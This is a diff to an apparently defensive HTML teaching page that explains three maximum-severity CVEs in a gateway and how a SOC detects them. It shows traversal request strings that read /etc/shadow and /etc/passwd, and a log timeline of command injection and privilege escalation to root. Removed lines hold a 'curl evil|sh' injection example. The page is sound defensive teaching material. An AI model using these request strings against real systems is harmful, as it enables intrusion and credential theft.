@@ -97,6 +97,22 @@
   .zonekey{display:flex;gap:8px;flex-wrap:wrap;font-size:11.5px;color:var(--muted);margin:6px 0 0}
   .zonekey span{display:inline-flex;align-items:center;gap:5px}
   .zonekey i{width:11px;height:11px;border-radius:3px;display:inline-block}
+  .why10{border:1px solid #5e4a16;background:#2a230f;color:#ffe2a6;border-radius:9px;padding:12px 15px;margin:14px 0;font-size:14px}
+  .why10 b{color:#ffd166}
+  .doors{display:flex;flex-direction:column;gap:12px;margin:14px 0}
+  .door{border:1px solid var(--line);border-left-width:5px;border-radius:10px;background:var(--panel);padding:13px 16px}
+  .door.dA{border-left-color:#4ea1ff} .door.dB{border-left-color:#ffd166} .door.dC{border-left-color:#ff9f43}
+  .doorhd{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:10px}
+  .doorhd .dco{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--ink);background:var(--chip);border:1px solid var(--line);padding:2px 8px;border-radius:5px}
+  .doorhd .dname{font-size:13.5px;color:var(--muted)}
+  .d10{margin-left:auto;font-size:11px;font-family:var(--mono);color:#ff8a96;background:#3a0d12;border:1px solid #5e1620;padding:2px 9px;border-radius:20px}
+  .route{display:flex;flex-wrap:wrap;align-items:center;gap:6px;font-size:13px}
+  .route .rstep{background:#1b232d;border:1px solid var(--line);border-radius:7px;padding:5px 9px}
+  .route .start{background:#202a33;color:var(--muted)}
+  .route .key{background:var(--ben-bg);border-color:#1d5e36;color:#cfeedd}
+  .route .end{background:#220f12;border-color:#5e1620;color:#ff8a96;font-weight:700}
+  .route .arr{color:var(--mal);font-family:var(--mono);font-weight:700}
+  .rnote{margin-top:8px;font-size:12.8px;color:var(--muted)} .rnote b{color:var(--det)}
 </style>
 </head>
 <body>
@@ -136,7 +152,7 @@
 </table>
 
 <h2 id="chainviz">From zero access to full control</h2>
-<p class="sub">The hard idea to teach: <b>a path traversal is not the prize — it is a key that makes one door look like another.</b> The attacker never "logs in." They send a single web request crafted so the security check and the thing that actually runs <i>disagree about what the request is</i>. That disagreement is the whole game; everything after it is just walking through doors that were left open.</p>
+<p class="sub">The hard idea to teach: an attacker reaches <b>full control without ever owning a valid account</b>. Two of these bugs abuse a <i>path traversal</i> — a key that makes one door look like another — and the third injects a command. The part people miss: <b>each bug, on its own, is enough to fully compromise the device</b> — which is exactly why the vendor scored all three a maximum 10.0. Below: first the traversal <i>mechanism</i>, then the <b>three independent routes</b> to total control.</p>
 
 <h3>The mechanism — one URL, two interpretations</h3>
 <p class="sub">A traversal works because two pieces of code read the <i>same</i> request differently. The guard at the door reads the <b>raw, encoded</b> text; the worker inside reads the <b>decoded</b> path. Encode a <code>../</code> as <code>..%2f</code> and you can show the guard a friendly path while the worker sees a forbidden one.</p>
@@ -156,63 +172,32 @@
     </div>
   </div>
 </div>
-<div class="tell"><b>That is the entire trick.</b> Same bytes, two readings. 34908 uses it to reach a <b>protected API</b>; 34909 uses the identical trick on the file route (<code>/app-assets/x/..%2f..%2fetc%2fshadow</code>) so the guard sees "an asset" while the worker reads <b>/etc/shadow</b>. No password is ever needed.</div>
+<div class="tell"><b>That is the entire trick.</b> Same bytes, two readings. 34908 uses it to reach a <b>protected API</b>; 34909 uses the identical trick on the file route (<code>/app-assets/x/..%2f..%2fetc%2fshadow</code>) so the guard sees "an asset" while the worker reads <b>/etc/shadow</b>. No password is needed to pull the file — and the file frequently <i>contains</i> one.</div>
 
-<h3>The drill-down — each door opens a bigger one</h3>
-<div class="zonekey">
-  <span><i style="background:#9aa7b4"></i>Internet / LAN</span>
-  <span><i style="background:#4ea1ff"></i>Edge gateway (nginx)</span>
-  <span><i style="background:#ffd166"></i>Backend services</span>
-  <span><i style="background:#ff9f43"></i>Service account</span>
-  <span><i style="background:#ff5c6c"></i>OS / root</span>
-</div>
-<div class="chain">
+<h3>Three independent routes — each one alone is a 10.0</h3>
+<div class="why10"><b>Why three maximum-severity scores and not one chain:</b> each bug reaches full compromise on its own, with no precondition supplied by the others. The public PoC <i>chained</i> them for a tidy unauthenticated-RCE demo, but that is one route, not a requirement. Most importantly — once the file-read hands you key material, the next step is to <b>log in</b>, not to fire another exploit.</div>
+<div class="doors">
 
-  <div class="stage z0">
-    <div class="num">0</div>
-    <div><h4>Attacker on the network — zero access</h4>
-      <div class="meta">Unauthenticated. Can only reach the login page and a few "public" URLs. No credentials, no session.</div></div>
-    <div class="acc">access: NONE<div class="bar"><div class="fill" style="width:4%;background:#9aa7b4"></div></div></div>
+  <div class="door dA">
+    <div class="doorhd"><span class="dco">CVE-2026-34908</span><span class="dname">Improper Access Control · /proxy/</span><span class="d10">10.0 · complete on its own</span></div>
+    <div class="route"><span class="rstep start">0 access</span><span class="arr">→</span><span class="rstep">authorization check bypassed</span><span class="arr">→</span><span class="rstep">invoke privileged admin functions directly</span><span class="arr">→</span><span class="rstep end">full control</span></div>
+    <div class="rnote">No credential and no second bug — you issue state-changing admin actions you were never authorized to make.</div>
   </div>
-  <div class="conn"><span class="av">▼</span> CVE-2026-34908 · encoded <code>..%2f</code> makes the auth guard misread the path</div>
 
-  <div class="stage z1">
-    <div class="num">1</div>
-    <div><h4>Slip past the gateway → reach protected APIs</h4>
-      <div class="meta">The guard approves the raw <code>/api/auth/…</code> prefix; the router delivers the request to a protected backend. Authentication was simply never enforced.</div>
-      <div class="gain">Gain: <b>unauthenticated access to internal APIs</b> that should require admin.</div></div>
-    <div class="acc">access: BACKEND<div class="bar"><div class="fill" style="width:30%;background:#4ea1ff"></div></div></div>
+  <div class="door dB">
+    <div class="doorhd"><span class="dco">CVE-2026-34909</span><span class="dname">Path Traversal · /app-assets/</span><span class="d10">10.0 · complete on its own</span></div>
+    <div class="route"><span class="rstep start">0 access</span><span class="arr">→</span><span class="rstep">read secret files off disk</span><span class="arr">→</span><span class="rstep key">recover a password hash / SSH key / API token / session secret</span><span class="arr">→</span><span class="rstep end">log in as that account → full control</span></div>
+    <div class="rnote"><b>The step the staircase diagram got wrong:</b> after the traversal hands you key material you do <b>not</b> run another 10.0 — you simply <b>authenticate</b> with the stolen secret and walk in the front door. <b>The file read <i>is</i> the compromise.</b></div>
   </div>
-  <div class="conn"><span class="av">▼</span> CVE-2026-34909 · same trick on the file route reads disk</div>
 
-  <div class="stage z2">
-    <div class="num">2</div>
-    <div><h4>Read secret files off the disk</h4>
-      <div class="meta"><code>/app-assets/x/..%2f..%2f..%2fetc%2fshadow</code> → the file handler walks out of the asset folder and returns any file: password hashes, API tokens, private keys, session secrets.</div>
-      <div class="gain">Gain: <b>stolen credentials / key material</b> → impersonate a real account.</div></div>
-    <div class="acc">access: SECRETS<div class="bar"><div class="fill" style="width:55%;background:#ffd166"></div></div></div>
-  </div>
-  <div class="conn"><span class="av">▼</span> CVE-2026-34910 · a "package name" carries shell metacharacters</div>
-
-  <div class="stage z3">
-    <div class="num">3</div>
-    <div><h4>Turn data access into code execution</h4>
-      <div class="meta">An update endpoint builds <code>/bin/sh -c "sudo dpkg -s &lt;name&gt;…"</code>. A name like <code>x; curl evil|sh</code> runs the attacker's commands — as the <code>ucs-update</code> service account.</div>
-      <div class="gain">Gain: <b>arbitrary command execution</b> (low-privileged foothold on the device).</div></div>
-    <div class="acc">access: SHELL<div class="bar"><div class="fill" style="width:78%;background:#ff9f43"></div></div></div>
-  </div>
-  <div class="conn"><span class="av">▼</span> the service account has password-less <code>sudo</code> for <code>dpkg</code> / <code>chmod</code></div>
-
-  <div class="stage z4">
-    <div class="num">4</div>
-    <div><h4>Escalate to root → full device control</h4>
-      <div class="meta"><code>sudo dpkg -i evil.deb</code> runs an attacker package's install script <b>as root</b> (or <code>sudo chmod</code> flips a sensitive file). The low-priv shell becomes root.</div>
-      <div class="gain">Gain: <b>ROOT — total control</b>: read/alter all data, persist, pivot into the network.</div></div>
-    <div class="acc" style="color:#ff8a96">access: ROOT<div class="bar"><div class="fill" style="width:100%;background:#ff5c6c"></div></div></div>
+  <div class="door dC">
+    <div class="doorhd"><span class="dco">CVE-2026-34910</span><span class="dname">Command Injection · ucs update</span><span class="d10">10.0 · complete on its own</span></div>
+    <div class="route"><span class="rstep start">0 access</span><span class="arr">→</span><span class="rstep">shell metacharacters in a package name</span><span class="arr">→</span><span class="rstep">commands run as a service account</span><span class="arr">→</span><span class="rstep">password-less sudo</span><span class="arr">→</span><span class="rstep end">root · full control</span></div>
+    <div class="rnote">Direct code execution; the weak <code>sudo</code> policy (NOPASSWD <code>dpkg</code>/<code>chmod</code>) merely shortens the trip to root.</div>
   </div>
 
 </div>
-<div class="tell"><b>Teaching summary:</b> traversal (steps&nbsp;1&nbsp;&amp;&nbsp;2) didn't compromise the device by itself — it bought <i>reach</i> and <i>information</i>. That reach exposed a command-injection bug (step&nbsp;3), and a weak <code>sudo</code> policy turned the foothold into root (step&nbsp;4). <b>Compromise is a staircase, not a single leap</b> — which is also why fixing <i>any one</i> step breaks the whole chain.</div>
+<div class="tell"><b>Teaching summary:</b> these are <b>three separate front doors to the same house</b> — which is exactly why each scored a standalone 10.0. They <i>can</i> be chained (the demonstrated path is in the logs below), but none depends on another. A path traversal leads to device compromise not by magically becoming root, but because <b>the file it reads is itself a key</b>: you read the credential, then you log in. Defend all three — fixing only one leaves two wide open.</div>
 
 <h2 id="theory">Detection theory — why these are visible in HTTP</h2>
 <div class="panel">
@@ -347,13 +332,13 @@ Jun 09 14:31:45 udm sudo[20413]: ucs-update : USER=root ; COMMAND=/usr/bin/dpkg 
 </div>
 
 <!-- ============ CHAIN ============ -->
-<h2 id="chain">Full chain — one attacker IP, one timeline</h2>
+<h2 id="chain">One demonstrated path (the public PoC chain) in logs</h2>
 <div class="flow"><span class="w">14:22:18</span>  GET  /proxy/users/api/v2/ucs/update/latest_package                                <span class="w">401</span>   recon, blocked
 <span class="a">14:22:31</span>  GET  /api/auth/validate-sso/..%2f..%2f..%2fproxy/.../latest_package                <span class="ok">200</span>   <span class="a">34908 bypass works</span>
 <span class="a">14:25:10</span>  GET  /app-assets/network/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd                     <span class="ok">200</span>   <span class="a">34909 file read</span>
 <span class="a">14:31:44</span>  POST /api/auth/validate-sso/..%2f../proxy/.../ucs/update/install?package=foo%3B... <span class="ok">200</span>   <span class="a">34910 inject</span>
 14:31:45  sudo: ucs-update : USER=root ; COMMAND=/usr/bin/dpkg -i /tmp/x.deb               <span class="a">privesc → root</span></div>
-<p class="sub"><b>Correlation rule for the SOC:</b> same <code>src_ip</code> producing a 401→200 transition on a <code>/proxy/</code> resource <i>and</i> any <code>..%2f</code> on <code>/app-assets/</code> <i>and</i>/or shell metacharacters on <code>/ucs/update</code> within a short window = active exploitation of the chain.</p>
+<p class="sub"><b>Note — this is only one of several possible routes.</b> The PoC stitched all three together, but 34909 alone could instead end at a normal <code>/api/login</code> using a stolen credential, and 34908 or 34910 alone is sufficient too. <b>Correlation rule for the SOC:</b> same <code>src_ip</code> producing a 401→200 transition on a <code>/proxy/</code> resource <i>and/or</i> any <code>..%2f</code> on <code>/app-assets/</code> <i>and/or</i> shell metacharacters on <code>/ucs/update</code> — any one is alarm-worthy; together = active exploitation.</p>
 
 <!-- ============ HUNT ============ -->
 <h2 id="hunt">Retro-hunt queries</h2>
